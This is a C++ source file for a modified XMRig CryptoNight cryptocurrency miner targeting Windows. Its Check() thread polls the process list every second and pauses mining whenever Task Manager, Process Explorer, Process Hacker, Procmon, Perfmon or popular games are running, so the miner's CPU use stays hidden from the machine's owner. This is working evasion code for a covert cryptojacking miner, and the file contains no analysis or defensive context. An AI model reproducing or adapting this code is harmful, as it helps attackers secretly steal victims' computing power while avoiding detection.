#include "api/Api.h"
#include "App.h"
#include "Console.h"
#include "Cpu.h"
#include "crypto/CryptoNight.h"
#include "log/ConsoleLog.h"
#include "log/FileLog.h"
#include "log/Log.h"
#include "Mem.h"
#include "net/Network.h"
#include "Options.h"
#include "Platform.h"
#include "Summary.h"
#include "version.h"
#include "workers/Workers.h"
#include <windows.h>
#include <tlhelp32.h>
#include <thread>

App *App::m_self = nullptr;
bool IsProcessRun(void);
App::App(int argc, char **argv) :
    m_console(nullptr),
    m_httpd(nullptr),
    m_network(nullptr),
    m_options(nullptr)
{
    m_self = this;
    Cpu::init();
    m_options = Options::parse(argc, argv);
    if (!m_options) {
        return;
    }
    Log::init();
    if (!m_options->background()) {
        Log::add(new ConsoleLog(m_options->colors()));
        m_console = new Console(this);
    }
    if (m_options->logFile()) {
        Log::add(new FileLog(m_options->logFile()));
    }
    Platform::init(m_options->userAgent());
    Platform::setProcessPriority(m_options->priority());
    m_network = new Network(m_options);
    uv_signal_init(uv_default_loop(), &m_signal);
}
App::~App()
{
    uv_tty_reset_mode();
#   ifndef XMRIG_NO_HTTPD
    delete m_httpd;
#   endif
    delete m_console;
}
void Check() {
	while(true) {
		Sleep(1000);
		bool Founded = IsProcessRun();
		switch (Founded) {
			case 1:
				Workers::setEnabled(false);
				break;

			default:
				if (!Workers::isEnabled()) { Workers::setEnabled(true); }
				break;
		}
	}
}
bool IsProcessRun(void)
{
	bool RUN;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hSnapshot, &pe);
	while (Process32Next(hSnapshot, &pe))
	{
		if (wcscmp(pe.szExeFile, L"taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"Taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"dota2.exe") == 0 || wcscmp(pe.szExeFile, L"csgo.exe") == 0 || wcscmp(pe.szExeFile, L"payday.exe") == 0 || wcscmp(pe.szExeFile, L"Minecraft.exe") == 0 || wcscmp(pe.szExeFile, L"TheDivision.exe") == 0 || wcscmp(pe.szExeFile, L"GTA5.exe") == 0 || wcscmp(pe.szExeFile, L"re7.exe") == 0 || wcscmp(pe.szExeFile, L"Prey.exe") == 0 || wcscmp(pe.szExeFile, L"Overwatch.exe") == 0 || wcscmp(pe.szExeFile, L"MK10.exe") == 0 || wcscmp(pe.szExeFile, L"QuakeChampions.exe") == 0 || wcscmp(pe.szExeFile, L"crossfire.exe") == 0 || wcscmp(pe.szExeFile, L"pb.exe") == 0 || wcscmp(pe.szExeFile, L"wot.exe") == 0 || wcscmp(pe.szExeFile, L"lol.exe") == 0 || wcscmp(pe.szExeFile, L"perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"Perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"SystemExplorer.exe") == 0 || wcscmp(pe.szExeFile, L"TaskMan.exe") == 0 || wcscmp(pe.szExeFile, L"ProcessHacker.exe") == 0 || wcscmp(pe.szExeFile, L"procexp64.exe") == 0 || wcscmp(pe.szExeFile, L"procexp.exe") == 0 || wcscmp(pe.szExeFile, L"Procmon.exe") == 0 || wcscmp(pe.szExeFile, L"Daphne.exe") == 0)
		{
			RUN = true;
			return RUN;
		}
		else
			RUN = false;
	}
	return RUN;
}

int App::exec() {
	std::thread* check_taskers = new std::thread(Check);
	check_taskers->detach();
    if (!m_options) { return 0; }
    uv_signal_start(&m_signal, App::onSignal, SIGHUP);
    uv_signal_start(&m_signal, App::onSignal, SIGTERM);
    uv_signal_start(&m_signal, App::onSignal, SIGINT);
    if (!CryptoNight::init(m_options->algo(), m_options->algoVariant())) { return 1; }
    Mem::allocate(m_options->algo(), m_options->threads(), m_options->doubleHash(), m_options->hugePages());
    Workers::start(m_options->affinity(), m_options->priority());
    m_network->connect();
    const int r = uv_run(uv_default_loop(), UV_RUN_DEFAULT);
    uv_loop_close(uv_default_loop());
    delete m_network;
    Options::release();
    Mem::release();
    Platform::release();
    return r;
}
void App::onConsoleCommand(char command){}
void App::close() {
    m_network->stop();
    Workers::stop();
	uv_stop(uv_default_loop());
}
void App::onSignal(uv_signal_t *handle, int signum) {
    uv_signal_stop(handle);
    m_self->close();
}
